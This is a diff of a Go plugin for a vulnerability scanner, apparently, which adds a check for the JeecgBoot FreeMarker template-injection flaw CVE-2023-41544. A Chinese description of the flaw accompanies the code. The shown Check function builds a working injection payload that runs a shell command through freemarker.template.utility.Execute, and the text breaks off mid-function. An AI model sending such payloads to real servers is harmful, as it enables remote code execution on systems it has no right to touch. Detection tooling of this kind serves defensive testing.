@@ -8,12 +8,12 @@ import (
 )
 
 func init() {
-	Register("plugin_template", &plugin_template{})
+	Register("jeecgboot_rce_cve_2023_41544", &jeecgboot_rce_cve_2023_41544{})
 }
 
-type plugin_template struct{}
+type jeecgboot_rce_cve_2023_41544 struct{}
 
-func (p *plugin_template) Info() PluginInfo {
+func (p *jeecgboot_rce_cve_2023_41544) Info() PluginInfo {
 	return PluginInfo{
 		Name:     "JeecgBoot 服务器端代码注入",
 		VulnInfo: "eecg Boot(或者称为JeecgQ-Boot)是一款基于代码生成器的开源企业级快速开发平台，Jeecg Boot jmreport/loadTableData接口存在FreeMarker SSTI注入漏洞，攻击者可以通过操纵应用程序的模板引擎来执行恶意代码或获取敏感信息。这种漏洞可能会导致整个应用程序被入侵，造成严重的安全问题。",
@@ -25,7 +25,7 @@ func (p *plugin_template) Info() PluginInfo {
 	}
 }
 
-func (p *plugin_template) Check(netloc string) bool {
+func (p *jeecgboot_rce_cve_2023_41544) Check(netloc string) bool {
 	rand_str := utils.GenRandom(10)
 	payload := `{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"`
 	payload += "echo " + rand_str
